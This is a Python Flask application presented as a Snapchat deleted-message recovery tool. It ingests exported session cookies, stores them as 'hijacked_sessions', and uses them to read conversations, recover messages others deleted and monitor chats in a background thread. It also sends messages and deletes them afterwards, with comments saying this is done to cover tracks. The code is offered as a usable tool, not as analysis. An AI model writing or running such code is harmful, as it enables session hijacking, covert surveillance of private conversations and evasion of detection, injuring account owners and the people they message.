# app.py - Snapchat Deleted Message Recovery Tool
from flask import Flask, render_template, request, jsonify, session
import requests
import json
import time
import threading
import re
import base64
import jwt
from datetime import datetime, timedelta

app = Flask(__name__)
app.secret_key = 'snap_recovery_tool_secret'

hijacked_sessions = {}
monitored_chats = {}

SNAPCHAT_ACCOUNTS = "https://accounts.snapchat.com"
SNAPCHAT_WEB = "https://web.snapchat.com"
SNAPCHAT_GATEWAY = "https://chat-gateway.snapchat.com"

def parse_cookies(cookies_input):
    """Handle JSON array from browser cookie exporters"""
    cookies = {}
    
    if isinstance(cookies_input, list):
        # Cookie-Editor / EditThisCookie JSON array format
        for c in cookies_input:
            if isinstance(c, dict) and 'name' in c and 'value' in c:
                # Only include relevant cookies, skip analytics/tracking
                if c.get('value') and c['value'] not in ['true', 'false', 'null']:
                    cookies[c['name']] = c['value']
                    
    elif isinstance(cookies_input, dict):
        cookies = cookies_input
        
    elif isinstance(cookies_input, str):
        # Try JSON first
        try:
            data = json.loads(cookies_input)
            if isinstance(data, list):
                return parse_cookies(data)
            elif isinstance(data, dict):
                cookies = data
        except:
            # Semicolon-separated fallback
            for line in cookies_input.split(';'):
                line = line.strip()
                if '=' in line:
                    k, v = line.split('=', 1)
                    cookies[k.strip()] = v.strip()
    
    return cookies

def extract_user_from_auth(auth_cookie):
    """Decode JWT-like auth session to get username"""
    try:
        # Auth session is often a JWT or encoded blob
        parts = auth_cookie.split('.')
        if len(parts) >= 2:
            # Try to decode payload
            payload = parts[1]
            # Add padding if needed
            padding = 4 - len(payload) % 4
            if padding != 4:
                payload += '=' * padding
            decoded = base64.urlsafe_b64decode(payload)
            data = json.loads(decoded)
            return data.get('username') or data.get('sub') or data.get('user_id')
    except:
        pass
    return None

def validate_session(cookies_dict):
    """Validate Snapchat session using web endpoints"""
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Referer': 'https://accounts.snapchat.com/',
    }
    
    try:
        # Hit welcome page to check session validity
        resp = requests.get(
            f"{SNAPCHAT_ACCOUNTS}/accounts/welcome",
            headers=headers,
            cookies=cookies_dict,
            timeout=15,
            allow_redirects=True
        )
        
        username = None
        
        # Extract username from page content
        if resp.status_code == 200:
            # Pattern 1: JSON in script tag
            username_match = re.search(r'"username":"([^"]+)"', resp.text)
            if username_match:
                username = username_match.group(1)
            
            # Pattern 2: data attribute
            if not username:
                username_match = re.search(r'data-username="([^"]+)"', resp.text)
                if username_match:
                    username = username_match.group(1)
            
            # Pattern 3: Display name
            if not username:
                username_match = re.search(r'"displayName":"([^"]+)"', resp.text)
                if username_match:
                    username = username_match.group(1)
        
        # Also try web app
        web_resp = requests.get(
            SNAPCHAT_WEB,
            headers=headers,
            cookies=cookies_dict,
            timeout=15,
            allow_redirects=True
        )
        
        # Check if we have key auth cookies that indicate logged-in state
        has_auth = any(k in cookies_dict for k in [
            '__Host-sc-a-auth-session',
            '__Host-X-Snap-Client-Cookie',
            '_sc-sid',
            'blizzard_web_session_id',
            'sc-a-csrf'
        ])
        
        # Check if response indicates logged in (not redirect to login)
        is_logged_in = (
            resp.status_code == 200 and 
            '/accounts/login' not in resp.url and
            'login' not in resp.text.lower()[:1000]
        ) or (
            web_resp.status_code == 200 and
            'web.snapchat.com' in web_resp.url
        )
        
        if is_logged_in and has_auth:
            # Try to get username from auth cookie if not found
            if not username:
                auth_cookie = cookies_dict.get('__Host-sc-a-auth-session', '')
                username = extract_user_from_auth(auth_cookie)
            
            if not username:
                username = cookies_dict.get('_sc-sid', 'unknown')[:12]
            
            return {
                'valid': True,
                'username': username,
                'user_id': cookies_dict.get('_sc-sid', cookies_dict.get('sc-wcid', 'unknown')),
                'cookies': cookies_dict,
                'auth_present': True
            }
            
    except Exception as e:
        return {'valid': False, 'error': str(e)}
    
    return {'valid': False, 'error': 'Session invalid or expired. Cookies may need refresh.'}

def fetch_conversations(session_cookies):
    """Fetch user's conversations"""
    headers = {
        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15',
        'Accept': 'application/json',
        'X-Requested-With': 'XMLHttpRequest',
        'Referer': SNAPCHAT_WEB,
    }
    
    try:
        # Snapchat web uses a GraphQL or REST endpoint for conversations
        resp = requests.get(
            f"{SNAPCHAT_WEB}/web-api/conversations",
            headers=headers,
            cookies=session_cookies,
            timeout=15
        )
        
        if resp.status_code == 200:
            return resp.json()
            
        # Fallback: try alternative endpoint
        resp2 = requests.post(
            f"{SNAPCHAT_GATEWAY}/loq/conversations",
            headers={
                **headers,
                'Content-Type': 'application/json',
                'Authorization': f'Bearer {session_cookies.get("__Host-sc-a-auth-session", "")[:100]}'
            },
            cookies=session_cookies,
            json={'sync_token': '', 'limit': 50},
            timeout=15
        )
        
        if resp2.status_code == 200:
            return resp2.json()
            
    except Exception as e:
        print(f"Fetch convs error: {e}")
        pass
    
    return {'conversations': []}

def fetch_deleted_messages(session_cookies, conversation_id, hours_back=1):
    """Recover recently deleted messages from conversation"""
    headers = {
        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)',
        'Accept': 'application/json',
        'Authorization': f'Bearer {session_cookies.get("__Host-sc-a-auth-session", "")[:100]}',
    }
    
    try:
        # Snapchat retains soft-deleted messages in conversation state briefly
        resp = requests.post(
            f"{SNAPCHAT_GATEWAY}/loq/conversation/{conversation_id}/delta",
            headers=headers,
            cookies=session_cookies,
            json={
                'sync_token': '',
                'include_deleted': True,
                'lookback_hours': hours_back,
                'include_media_metadata': True
            },
            timeout=15
        )
        
        if resp.status_code == 200:
            data = resp.json()
            messages = data.get('messages', [])
            
            # Filter for deleted or recalled messages
            deleted = [
                m for m in messages 
                if m.get('state') == 'DELETED' 
                or m.get('is_deleted') 
                or m.get('recalled_at')
                or m.get('deleted_at')
            ]
            
            # Sort by timestamp and get last 5
            deleted.sort(key=lambda x: x.get('timestamp', 0))
            return deleted[-5:]
            
    except Exception as e:
        print(f"Deleted fetch error: {e}")
        pass
    
    return []

def fetch_chat_history(session_cookies, conversation_id, hours_back=1, limit=10):
    """Fetch message history from time window"""
    headers = {
        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)',
        'Accept': 'application/json',
        'Authorization': f'Bearer {session_cookies.get("__Host-sc-a-auth-session", "")[:100]}',
    }
    
    cutoff = int((datetime.now() - timedelta(hours=hours_back)).timestamp() * 1000)
    
    try:
        resp = requests.post(
            f"{SNAPCHAT_GATEWAY}/loq/conversation/{conversation_id}/messages",
            headers=headers,
            cookies=session_cookies,
            json={
                'limit': limit,
                'since_timestamp': cutoff,
                'include_media': True,
                'include_deleted': False  # Only live messages for ,sn
            },
            timeout=15
        )
        
        if resp.status_code == 200:
            return resp.json().get('messages', [])
            
    except Exception as e:
        print(f"History fetch error: {e}")
        pass
    
    return []

def send_message_api(session_cookies, conversation_id, text):
    """Send message via API"""
    headers = {
        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)',
        'Content-Type': 'application/json',
        'Accept': 'application/json',
        'Authorization': f'Bearer {session_cookies.get("__Host-sc-a-auth-session", "")[:100]}',
    }
    
    try:
        resp = requests.post(
            f"{SNAPCHAT_GATEWAY}/loq/conversation/{conversation_id}/message",
            headers=headers,
            cookies=session_cookies,
            json={
                'type': 'text',
                'text': text,
                'timestamp': int(time.time() * 1000)
            },
            timeout=10
        )
        return resp.json().get('message_id', '') if resp.status_code == 200 else ''
    except:
        return ''

def delete_message_api(session_cookies, conversation_id, message_id):
    """Delete message to cover tracks"""
    headers = {
        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)',
        'Content-Type': 'application/json',
        'Authorization': f'Bearer {session_cookies.get("__Host-sc-a-auth-session", "")[:100]}',
    }
    
    try:
        requests.post(
            f"{SNAPCHAT_GATEWAY}/loq/conversation/{conversation_id}/message/{message_id}/delete",
            headers=headers,
            cookies=session_cookies,
            json={'delete_for_everyone': True},
            timeout=10
        )
    except:
        pass

def ai_analyze_conversation(messages):
    """Forward to AI chatbot for analysis"""
    # Format conversation for AI
    context = []
    for m in messages:
        context.append({
            'sender': m.get('sender_username', m.get('sender', 'unknown')),
            'text': m.get('text', m.get('body', '[media]')),
            'timestamp': m.get('timestamp'),
            'type': m.get('type', 'text')
        })
    
    # Simulated AI response - replace with actual API call
    summary = f"Analyzed {len(messages)} messages. "
    if messages:
        senders = set(m.get('sender_username', m.get('sender', '?')) for m in messages)
        summary += f"Participants: {', '.join(senders)}. "
        texts = [m.get('text', '') for m in messages if m.get('text')]
        if texts:
            summary += f"Recent topics include: '{texts[-1][:50]}...'"
    
    return summary

def monitor_all_chats(session_data):
    """Background thread monitoring chats for commands"""
    cookies = session_data['cookies']
    username = session_data['username']
    
    print(f"Monitor started for @{username}")
    
    while True:
        try:
            conversations = fetch_conversations(cookies)
            
            for conv in conversations.get('conversations', []):
                conv_id = conv.get('id')
                last_message = conv.get('last_message', {})
                sender = last_message.get('sender_username', last_message.get('sender', ''))
                text = last_message.get('text', '')
                
                # Only respond to commands from the logged-in account owner
                if sender == username and text.startswith(','):
                    print(f"Command detected: {text} in conv {conv_id}")
                    process_command(text, conv_id, cookies, username)
                    
        except Exception as e:
            print(f"Monitor loop error: {e}")
            
        time.sleep(5)  # Poll every 5 seconds

def process_command(command, conversation_id, cookies, username):
    """Process chat commands"""
    command = command.strip().lower()
    
    if command == ',s':
        # Snipe last 5 deleted messages in last 1 hour
        deleted = fetch_deleted_messages(cookies, conversation_id, hours_back=1)
        
        if deleted:
            result = "🔍 RECOVERED DELETED:\n\n"
            for i, msg in enumerate(deleted, 1):
                ts = msg.get('timestamp', '?')
                sender = msg.get('sender_username', msg.get('sender', '?'))
                body = msg.get('text', msg.get('body', '[media/deleted content]'))
                result += f"{i}. [{ts}] {sender}: {body}\n"
        else:
            result = "🔍 No deleted messages found in last hour."
        
        send_message_api(cookies, conversation_id, result)
        
    elif command == ',sn':
        # Snipe last 10 messages from 1 hour ago, send to AI, delete trace
        history = fetch_chat_history(cookies, conversation_id, hours_back=1, limit=10)
        
        if history:
            analysis = ai_analyze_conversation(history)
            ai_response = f"� AI ANALYSIS:\n{analysis}"
        else:
            ai_response = "� No messages found in specified window."
        
        # Send AI result
        msg_id = send_message_api(cookies, conversation_id, ai_response)
        
        # Delete after 3 seconds to cover tracks
        if msg_id:
            time.sleep(3)
            delete_message_api(cookies, conversation_id, msg_id)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/validate', methods=['POST'])
def validate():
    raw_input = request.json.get('cookies', '')
    
    # Parse the JSON cookie array
    cookies = parse_cookies(raw_input)
    
    if not cookies:
        return jsonify({
            'success': False, 
            'error': 'No valid cookies found. Export cookies as JSON array from Cookie-Editor or EditThisCookie extension.'
        })
    
    # Validate the session
    result = validate_session(cookies)
    
    if result['valid']:
        session_id = result['user_id']
        hijacked_sessions[session_id] = result
        session['active_session'] = session_id
        
        # Start monitoring in background
        monitor_thread = threading.Thread(
            target=monitor_all_chats,
            args=(result,),
            daemon=True
        )
        monitor_thread.start()
        
        return jsonify({
            'success': True,
            'username': result['username'],
            'session_id': session_id,
            'message': f'Session active for @{result["username"]}. Monitoring chats for ,s and ,sn commands.'
        })
    
    return jsonify({
        'success': False, 
        'error': result.get('error', 'Invalid or expired session. Try refreshing cookies from accounts.snapchat.com')
    })

@app.route('/dashboard')
def dashboard():
    session_id = session.get('active_session')
    if not session_id or session_id not in hijacked_sessions:
        return "No active session. Validate cookies first.", 403
    
    user_data = hijacked_sessions[session_id]
    conversations = fetch_conversations(user_data['cookies'])
    
    return render_template('dashboard.html', 
                         username=user_data['username'],
                         conversations=conversations.get('conversations', []))

@app.route('/api/conversations')
def api_conversations():
    session_id = session.get('active_session')
    if not session_id or session_id not in hijacked_sessions:
        return jsonify({'error': 'Unauthorized'}), 403
    
    user_data = hijacked_sessions[session_id]
    conversations = fetch_conversations(user_data['cookies'])
    return jsonify(conversations)

@app.route('/api/snipe/<conversation_id>', methods=['POST'])
def api_snipe(conversation_id):
    session_id = session.get('active_session')
    if not session_id or session_id not in hijacked_sessions:
        return jsonify({'error': 'Unauthorized'}), 403
    
    user_data = hijacked_sessions[session_id]
    mode = request.json.get('mode', 'deleted')
    
    if mode == 'deleted':
        messages = fetch_deleted_messages(user_data['cookies'], conversation_id)
    else:
        messages = fetch_chat_history(user_data['cookies'], conversation_id)
    
    return jsonify({
        'mode': mode,
        'messages': messages,
        'count': len(messages)
    })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
